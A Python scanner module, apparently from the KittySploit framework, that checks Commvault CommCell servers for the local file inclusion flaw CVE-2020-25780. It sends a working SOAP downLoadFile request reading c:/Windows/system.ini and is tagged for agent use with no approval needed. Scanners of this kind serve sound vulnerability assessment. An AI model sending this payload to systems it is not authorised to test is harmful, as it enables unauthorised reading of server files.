#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CommCell in Commvault before 14."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Commvault CommCell - Local File Inclusion Detection',
        'description': 'CommCell in Commvault before 14.68, 15.x before 15.58, 16.x before 16.44, 17.x before 17.29, and 18.x before 18.13 are vulnerable to local file inclusion because an attacker can view a log file can instead view a file outside of the log-files folder.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'commvault', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://srcincite.io/blog/2021/11/22/unlocking-the-vault.html',
            'http://kb.commvault.com/article/63264',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-25780',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-25780',
    }

    def run(self):
        path = '/SearchSvc/CVSearchService.svc'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Cookie': 'Login', 'soapaction': 'http://tempuri.org/ICVSearchSvc/downLoadFile', 'content-type': 'text/xml'}, data='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('downLoadFileResult',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='high',
                reason='Commvault CommCell - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

